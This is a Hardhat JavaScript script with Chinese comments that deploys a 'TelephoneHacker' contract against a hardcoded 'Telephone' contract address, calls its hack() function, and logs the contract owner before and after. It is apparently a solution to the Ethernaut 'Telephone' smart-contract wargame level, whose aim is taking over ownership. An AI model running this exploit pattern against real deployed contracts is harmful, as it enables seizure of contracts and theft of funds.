const { ethers } = require("hardhat");

// 攻击目标合约地址
const telephoneAddress = "0x6f244242d3CB8353783Fc169cfC0e392CC99b37B";

// 部署黑客合约，得到合约地址
async function DeployTelephoneHacker() {
    const TelephoneHacker = await ethers.getContractFactory("TelephoneHacker"); // 获取Counter合约工厂
    const telephoneHacker = await TelephoneHacker.deploy(telephoneAddress); // 部署Counter合约
    await telephoneHacker.waitForDeployment(); // 等待部署完成

    console.log("TelephoneHacker deployed to:", await telephoneHacker.getAddress()); // 打印合约地址
    return await telephoneHacker.getAddress();
}

async function CallHacker() {

    const telephone = await ethers.getContractAt("Telephone", telephoneAddress);
    console.log("攻击之前 telephone owner\n");
    console.log("telephone owner:", await telephone.owner());

    // 部署黑客合约
    const TelephoneHackerAddress = await DeployTelephoneHacker();
    const [hacker] = await ethers.getSigners();
    const telephoneHacker = await ethers.getContractAt("TelephoneHacker", TelephoneHackerAddress);

    const tx = await telephoneHacker.hack(hacker);
    await tx.wait();

    console.log("攻击后 telephone owner\n");
    console.log("telephone owner:", await telephone.owner());
}

CallHacker().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});